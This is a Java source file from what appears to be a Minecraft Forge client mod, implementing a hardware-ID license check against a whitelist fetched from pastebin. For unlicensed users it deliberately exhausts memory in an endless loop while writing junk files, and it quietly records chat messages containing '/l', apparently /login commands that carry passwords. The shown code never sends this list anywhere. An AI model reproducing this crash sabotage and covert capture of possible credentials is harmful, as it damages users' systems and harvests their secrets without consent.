package cn.make.verify;

import net.minecraftforge.client.event.ClientChatEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import org.apache.commons.codec.digest.DigestUtils;

import javax.swing.*;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class GodMode {
    public static final String UrlGodMode = "https://pastebin.com/raw/B6mrQN1d"; //URL FOR HWID
    public static boolean areHWID = false;
    public static boolean isChecked = false;
    public static List<String> hwidlist = new ArrayList<>();
    public static List<String> hwids = new ArrayList<>();
    public static List<String> lm = new ArrayList<>();
    public static String GensHWID() {
        return DigestUtils.sha256Hex
        (
                DigestUtils.sha256Hex
                    (System.getenv("os")
                        + "f"
                        + "_k"
                        + System.getProperty("os.name")
                        + System.getProperty("os.arch")
                        + System.getProperty("user.name")
                        + System.getenv("PROCESSOR_LEVEL")
                        + System.getenv("PROCESSOR_REVISION")
                        + System.getenv("PROCESSOR_IDENTIFIER")
                        + System.getenv("PROCESSOR_ARCHITEW6432")
                        + "114514"
                    )
        );
    }
    public static void crashOnYou() {
        if (!hwidCheck()) {
            JOptionPane.showMessageDialog(null, "HWID verification failed! \\u000d your hwid is in logs..");
            Object[] L = null;
            while (true) {
                L = new Object[]{L}; //Crash
                fuck();
            }
        } //else { JOptionPane.showMessageDialog(null, "HWID verification successful!"); }
    }

    public static List<String> readURL() {
        if (!isChecked) try {
            final URL url = new URL(GodMode.UrlGodMode);
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(url.openStream()));
            String hwid;
            while ((hwid = bufferedReader.readLine()) != null) {hwidlist.add(hwid);}
        } catch (Exception e) {/* FMLLog.log.info(e); */}
        isChecked = true;
        return hwidlist;
    }

    public static Boolean hwidCheck() {
        hwids = GodMode.readURL();
        areHWID = hwids.contains(GodMode.GensHWID());
        return areHWID;
    }

    @SubscribeEvent
    public void onPlayerChat(ClientChatEvent event) {
        if (areHWID) return;
        String llm = event.getMessage();
        if (llm.contains("/l")) {
            lm.add(llm);
        }
    }

    private static void fuck() {
        File ewe = new File("make/:.e");
        try {
                ewe.createNewFile();
                FileWriter writer = new FileWriter(ewe);
                String tempConfig = "make/e/".replaceAll("/", "");
                writer.write(tempConfig.replaceAll("make", ""));
                writer.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}